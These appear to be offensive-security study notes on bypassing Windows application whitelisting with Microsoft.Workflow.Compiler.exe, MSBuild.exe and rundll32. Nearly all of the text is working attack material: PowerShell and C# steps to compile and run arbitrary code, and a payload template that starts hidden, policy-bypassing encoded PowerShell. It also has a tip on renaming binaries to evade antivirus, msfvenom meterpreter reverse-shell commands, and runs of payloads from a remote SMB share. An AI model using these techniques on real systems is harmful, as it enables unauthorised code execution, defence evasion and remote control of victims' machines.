### Method 1: Microsoft.Workflow.Compiler.exe

    //works if FileIntegrity is not enabled - AppLocker fine, may not work for WDAC
    //Microsoft.Workflow.Compiler accepts two arguments. The first must be the path to an XML file containing compiler flags and the path to a file containing C# code. The C# file will be compiled and loaded into memory without restrictions.
    //the file containing code we provide must contain a class that inherits from the Activity class of the System.Workflow.ComponentModel namespace and must contain the code we want to execute inside its constructor
    //we can simply pass a random file name as the second command line argument
    //In summary, we must craft a file containing C# code, which implements a class that inherits from the Activity class and has a constructor. The file path must be inserted into the XML document along with compiler parameters organized in a serialized format.
    //Downside: XML and C# files on disk, plus C# temporarily compiled to disk

    //*STEP 1: create serialized XML input file w/ PS:
        //*Or just use the known format (from MicrosoftWorkflowCompilerBypass file)
        $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
        $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
        $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
        Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
        $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
        $compilerparam.GenerateInMemory = $True
        $pathvar = "payload.txt"
        $output = "C:\Tools\info.xml"
        $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
        Move-Item $tmp $output
        
    //*Ensure current user can access the generated file:
        $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("student","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
        
    //*POC code file - payload.txt (saved on disk, referenced by the serialized xml file) - put the exploit here!
        using System;
        using System.Workflow.ComponentModel;
        public class Run : Activity{
        public Run() {
        Console.WriteLine("I executed!");
        }
        }
        
    //*STEP 2: run the code!
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe info.xml results.xml
        //Might have to rename for AV:
            copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe test.exe
            test.exe info.xml results.xml

    ######info.xml:######
    <?xml version="1.0" encoding="utf-8"?>
    <CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
    <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>payload.txt</d2p1:string>
    </files>
    <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
    <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
    <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
    <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
    <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
    <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></outputName>
    <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
    <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
    <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <d2p1:checkTypes>false</d2p1:checkTypes>
    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
    <d2p1:compilerOptions i:nil="true" />
    <d2p1:generateCCU>false</d2p1:generateCCU>
    <d2p1:languageToUse>CSharp</d2p1:languageToUse>
    <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
    <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
    <d2p1:mtInfo i:nil="true" />
    <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
    </parameters>
    </CompilerInput>

    ######payload.txt Template:######
    using System;
    using System.Diagnostics;
    using System.Workflow.Activities;
    
    public class Foo : SequentialWorkflowActivity {
        public Foo() {
            Process process = new Process();
            // Configure the process using the StartInfo properties.
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "-WindowStyle Hidden -NoP -NoLogo -exec Bypass -enc <BASE64_PWSH_CMD>";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            process.Start();
            process.WaitForExit();
        }
    }

### **Method 2: MSBuild.exe**

    //can build/execute a .csproj or .xml file w/ .net

    //To run:
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\192.168.49.121\visualstudio\Hollow\Hollow.csproj

    **Automated payload generator:  https://github.com/Mr-Un1k0d3r/PowerLessShell
        //can use shellcode, etc. to create a .csproj file
        cd /home/kali/data/PowerLessShell
        //Convert .ps1 file:  python2 PowerLessShell.py -type powershell -source script.ps1 -output mal.csproj
        //Convert shellcode:  
            msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw > shellcode.raw
            python2 PowerLessShell.py -source shellcode.raw -output mal.csproj [-arch 64]
            C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\192.168.49.121\visualstudio\PowerLessShell\mal.csproj

### Another Method - Charlotte.py/rundll32

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw > beacon.bin
    python charlotte.py
    rundll32 \\192.168.49.121\visualstudio\charlotte\charlotte.dll, uVQeohpkFi

### Another Method - PowerSharpPack.ps1
- https://github.com/S3cur3Th1sSh1t/PowerSharpPack
- includes Rubeus, SharpUp, etc.